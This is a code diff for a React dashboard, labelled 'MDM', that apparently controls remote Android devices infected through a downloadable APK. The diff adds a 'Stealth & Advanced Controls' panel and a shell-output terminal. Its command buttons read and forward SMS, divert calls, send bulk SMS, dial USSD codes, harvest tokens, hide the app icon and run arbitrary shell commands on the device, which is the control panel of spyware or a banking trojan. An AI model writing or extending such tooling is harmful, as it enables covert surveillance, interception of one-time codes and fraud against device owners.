@@ -5,8 +5,7 @@ export default function Dashboard() {
   const [activeTab, setActiveTab] = useState('Home');
   const [devices, setDevices] = useState<any>({});
   const [selectedDevice, setSelectedDevice] = useState<string | null>(null);
-  const [galleryImages, setGalleryImages] = useState<string[]>([]);
-  const [simInfo, setSimInfo] = useState<any>(null);
+  const [terminalOut, setTerminalOut] = useState<string>('');
   const ws = useRef<WebSocket | null>(null);
 
   useEffect(() => {
@@ -18,8 +17,7 @@ export default function Dashboard() {
           setDevices((prev: any) => ({ ...prev, [data.device_id]: data }));
           if (!selectedDevice) setSelectedDevice(data.device_id);
         }
-        if (data.type === 'gallery_response') setGalleryImages(data.images);
-        if (data.type === 'sim_info_response') setSimInfo(JSON.parse(data.data));
+        if (data.type === 'shell_response') setTerminalOut(data.data);
       } catch (e) {}
     };
     return () => ws.current?.close();
@@ -28,9 +26,6 @@ export default function Dashboard() {
   const sendCommand = (command: string, payload: any = {}) => {
     if (ws.current?.readyState === WebSocket.OPEN && selectedDevice) {
       ws.current.send(JSON.stringify({ target: selectedDevice, type: 'cmd', command, payload }));
-      alert(`Command '${command}' Sent!`);
-    } else {
-      alert("Device not selected or disconnected!");
     }
   };
 
@@ -49,21 +44,32 @@ export default function Dashboard() {
           </div>
         </div>
         <div className="flex items-center gap-4">
-          <a href="/crazy-onxy-MDM/app-debug.apk" download className="bg-purple-600 hover:bg-purple-700 text-white px-4 py-2 rounded-lg font-bold text-sm shadow-lg">⬇ Download APK</a>
-          <button onClick={handleLogout} className="text-sm text-red-400 border border-red-500 px-3 py-1 rounded-full hover:bg-red-900">Logout</button>
+          <a href="/crazy-onxy-MDM/app-debug.apk" download className="bg-purple-600 px-4 py-2 rounded-lg font-bold text-sm">⬇ Download APK</a>
+          <span className="text-xl cursor-pointer">⚙️</span>
+          <span className="text-sm text-purple-400 border border-purple-500 px-3 py-1 rounded-full">🔑 Sessions</span>
+          <span className="text-xl cursor-pointer">🌙</span>
+          <button onClick={handleLogout} className="text-xs text-red-500 border border-red-500 px-2 py-1 rounded">Logout</button>
         </div>
       </header>
 
-      {/* NAVIGATION */}
-      <nav className="flex gap-6 p-4 border-b border-gray-800 text-sm">
-        {['Home', 'Gallery', 'SIM Control', 'Terminal'].map(tab => (
-          <button key={tab} onClick={() => setActiveTab(tab)} className={`pb-2 ${activeTab === tab ? 'border-b-2 border-purple-500 text-white font-bold' : 'text-gray-400'}`}>{tab}</button>
+      {/* MAIN NAVIGATION */}
+      <nav className="flex gap-6 p-4 border-b border-gray-800 text-sm overflow-x-auto">
+        {['Home', 'Data', 'Messages', 'Groups', 'Devices', 'Terminal', 'Help'].map(tab => (
+          <button key={tab} onClick={() => setActiveTab(tab)} className={`pb-2 whitespace-nowrap ${activeTab === tab ? 'border-b-2 border-purple-500 text-white font-bold' : 'text-gray-400'}`}>{tab}</button>
         ))}
       </nav>
 
       <main className="p-4">
-        {selectedDevice ? (
+        {/* DASHBOARD HOME TAB */}
+        {activeTab === 'Home' && selectedDevice && (
           <>
+            {/* SUB TABS */}
+            <div className="flex gap-2 mb-4 text-sm overflow-x-auto">
+              {['Home', 'Data', 'Messages (200)', 'Gallery', 'Permissions'].map(tab => (
+                <button key={tab} className={`px-4 py-2 rounded whitespace-nowrap ${tab === 'Home' ? 'bg-blue-600 font-bold' : 'bg-[#1A1B23] text-gray-400'}`}>{tab}</button>
+              ))}
+            </div>
+
             {/* DEVICE CARD */}
             <div className="bg-[#1A1B23] p-5 rounded-xl border border-gray-800 mb-6">
               <div className="flex justify-between items-start mb-4">
@@ -71,63 +77,85 @@ export default function Dashboard() {
               </div>
               <div className="grid grid-cols-2 gap-y-3 text-sm text-gray-300">
                 <div className="flex justify-between pr-4"><span>ID</span> <span className="text-white">{selectedDevice}</span></div>
-                <div className="flex justify-between pr-4"><span>IP Address</span> <span className="text-blue-400">{dev.ip || 'N/A'}</span></div>
+                <div className="flex justify-between pr-4"><span>IP Address</span> <span className="text-blue-400">{dev.ip || 'Fetching...'}</span></div>
+                <div className="flex justify-between pr-4"><span>Connection</span> <span className="text-green-400">🟢 Online</span></div>
+                <div className="flex justify-between pr-4"><span>FCM Token</span> <span className="text-green-400">✔️ Token OK</span></div>
               </div>
             </div>
 
-            {/* HOME TAB (8 Buttons + Stealth) */}
-            {activeTab === 'Home' && (
-              <div className="grid grid-cols-4 gap-3 mb-6">
-                {[
-                  { label: 'Check Online', icon: '📡', cmd: 'CHECK_ONLINE' },
-                  { label: 'GET SMS', icon: '📥', cmd: 'GET_SMS' },
-                  { label: 'Bulk SMS', icon: '✉️', cmd: 'BULK_SMS' },
-                  { label: 'Send SMS', icon: '📤', cmd: 'SEND_SMS' },
-                  { label: 'SMS Forward', icon: '🔄', cmd: 'SMS_FORWARD' },
-                  { label: 'Call Forward', icon: '📞', cmd: 'CALL_FORWARD' },
-                  { label: 'Dial USSD', icon: '🔢', cmd: 'DIAL_USSD' },
-                  { label: 'Auto Token', icon: '⚡', cmd: 'AUTO_TOKEN' },
-                  { label: 'Hide Icon', icon: '🕵️', cmd: 'HIDE_ICON' },
-                  { label: 'Show Icon', icon: '👁️', cmd: 'SHOW_ICON' }
-                ].map((btn, i) => (
-                  <button key={i} onClick={() => sendCommand(btn.cmd)} className="bg-[#1A1B23] border border-gray-800 hover:border-purple-500 p-4 rounded-xl flex flex-col items-center justify-center gap-2 transition">
-                    <span className="text-2xl">{btn.icon}</span>
-                    <span className="text-xs font-semibold text-gray-300">{btn.label}</span>
-                  </button>
-                ))}
-              </div>
-            )}
+            {/* 8 CORE BUTTONS */}
+            <div className="grid grid-cols-4 gap-3 mb-6">
+              {[
+                { label: 'Check Online', icon: '📡', cmd: 'CHECK_ONLINE' },
+                { label: 'GET SMS', icon: '📥', cmd: 'GET_SMS' },
+                { label: 'Bulk SMS', icon: '✉️', cmd: 'BULK_SMS' },
+                { label: 'Send SMS', icon: '📤', cmd: 'SEND_SMS' },
+                { label: 'SMS Forward', icon: '🔄', cmd: 'SMS_FORWARD' },
+                { label: 'Call Forward', icon: '📞', cmd: 'CALL_FORWARD' },
+                { label: 'Dial USSD', icon: '🔢', cmd: 'DIAL_USSD' },
+                { label: 'Auto Token', icon: '⚡', cmd: 'AUTO_TOKEN' }
+              ].map((btn, i) => (
+                <button key={i} onClick={() => sendCommand(btn.cmd)} className="bg-[#1A1B23] border border-gray-800 hover:border-purple-500 p-4 rounded-xl flex flex-col items-center justify-center gap-2 transition">
+                  <span className="text-2xl">{btn.icon}</span>
+                  <span className="text-xs font-semibold text-gray-300">{btn.label}</span>
+                </button>
+              ))}
+            </div>
 
-            {/* GALLERY TAB */}
-            {activeTab === 'Gallery' && (
-              <div className="space-y-4">
-                <button onClick={() => sendCommand('GET_GALLERY')} className="bg-blue-600 px-4 py-2 rounded text-sm font-bold">Fetch Photos</button>
-                <div className="grid grid-cols-4 gap-2">
-                  {galleryImages.map((b64, i) => <img key={i} src={`data:image/jpeg;base64,${b64}`} className="w-full rounded" />)}
-                </div>
+            {/* STEALTH BOX (New Space Used) */}
+            <div className="bg-[#1A1B23] p-5 rounded-xl border border-purple-900 mb-6">
+              <h3 className="text-md font-bold text-purple-400 mb-4 flex items-center gap-2">🕵️ Stealth & Advanced Controls</h3>
+              <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
+                <button onClick={() => sendCommand('HIDE_ICON')} className="bg-black border border-purple-800 hover:bg-purple-900 text-white p-3 rounded-lg flex flex-col items-center gap-1"><span className="text-xl">🙈</span><span className="text-xs font-bold">Hide Icon</span></button>
+                <button onClick={() => sendCommand('SHOW_ICON')} className="bg-black border border-gray-700 hover:bg-gray-800 text-white p-3 rounded-lg flex flex-col items-center gap-1"><span className="text-xl">👁️</span><span className="text-xs font-bold">Show Icon</span></button>
+                <button className="bg-black border border-gray-700 hover:bg-gray-800 text-white p-3 rounded-lg flex flex-col items-center gap-1"><span className="text-xl">🔒</span><span className="text-xs font-bold">Admin Lock</span></button>
+                <button onClick={() => setActiveTab('Terminal')} className="bg-black border border-gray-700 hover:bg-gray-800 text-white p-3 rounded-lg flex flex-col items-center gap-1"><span className="text-xl">💻</span><span className="text-xs font-bold">Terminal</span></button>
               </div>
-            )}
-
-            {/* SIM CONTROL TAB */}
-            {activeTab === 'SIM Control' && (
-              <div className="space-y-4">
-                <button onClick={() => sendCommand('GET_SIM_INFO')} className="bg-green-600 px-4 py-2 rounded text-sm font-bold">Fetch SIM Info</button>
-                <pre className="bg-black p-4 rounded text-green-400 text-sm">{simInfo ? JSON.stringify(simInfo, null, 2) : 'No Data'}</pre>
-              </div>
-            )}
-
-            {/* TERMINAL TAB */}
-            {activeTab === 'Terminal' && (
-              <div className="bg-[#1A1B23] p-4 rounded-xl border border-gray-800">
-                <input type="text" id="cmdInput" className="bg-black border border-gray-700 rounded p-2 w-full text-white font-mono mb-2" placeholder="Enter shell command..." />
-                <button onClick={() => {
-                    const cmd = (document.getElementById('cmdInput') as HTMLInputElement).value;
-                    sendCommand('EXECUTE_SHELL', { command: cmd });
-                }} className="bg-purple-600 px-4 py-2 rounded">Run</button>
-              </div>
-            )}
+            </div>
           </>
-        ) : <div className="text-center text-gray-500 mt-10">Waiting for device connection...</div>}
+        )}
+
+        {/* HELP TAB */}
+        {activeTab === 'Help' && (
+          <div className="bg-[#1A1B23] p-6 rounded-xl border border-gray-800 text-gray-300 space-y-4 text-sm">
+            <h2 className="text-xl font-bold text-purple-400 mb-4">Dashboard Guide</h2>
+            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+              <div>
+                <h3 className="font-bold text-white mb-2">Core Actions</h3>
+                <ul className="list-disc pl-5 space-y-1">
+                  <li><strong>Check Online:</strong> Pings the device.</li>
+                  <li><strong>GET SMS:</strong> Fetches SMS from device.</li>
+                  <li><strong>Send/Bulk SMS:</strong> Sends SMS from device.</li>
+                  <li><strong>SMS/Call Forward:</strong> Diverts SMS/Calls.</li>
+                  <li><strong>Dial USSD:</strong> Runs USSD code (*123#).</li>
+                </ul>
+              </div>
+              <div>
+                <h3 className="font-bold text-white mb-2">Stealth & Advanced</h3>
+                <ul className="list-disc pl-5 space-y-1">
+                  <li><strong>Hide Icon:</strong> Hides app icon on device.</li>
+                  <li><strong>Terminal:</strong> Runs shell commands.</li>
+                </ul>
+              </div>
+            </div>
+          </div>
+        )}
+
+        {/* TERMINAL TAB */}
+        {activeTab === 'Terminal' && selectedDevice && (
+          <div className="bg-[#1A1B23] p-6 rounded-xl border border-gray-800">
+            <h2 className="text-xl font-bold text-purple-400 mb-4">Command Centre</h2>
+            <div className="flex gap-2 mb-4">
+              <input type="text" id="cmdInput" placeholder="e.g. pm list packages" className="bg-black border border-gray-700 rounded p-3 w-full font-mono text-white" />
+              <button onClick={() => {
+                  const cmd = (document.getElementById('cmdInput') as HTMLInputElement).value;
+                  sendCommand('EXECUTE_SHELL', { command: cmd });
+                  setTerminalOut('Executing...');
+              }} className="bg-purple-600 px-6 py-2 rounded font-bold">Run</button>
+            </div>
+            <pre className="bg-black p-4 rounded-lg border border-gray-700 text-green-400 text-sm overflow-x-auto min-h-[200px]">{terminalOut || 'Terminal ready...'}</pre>
+          </div>
+        )}
       </main>
     </div>
   );
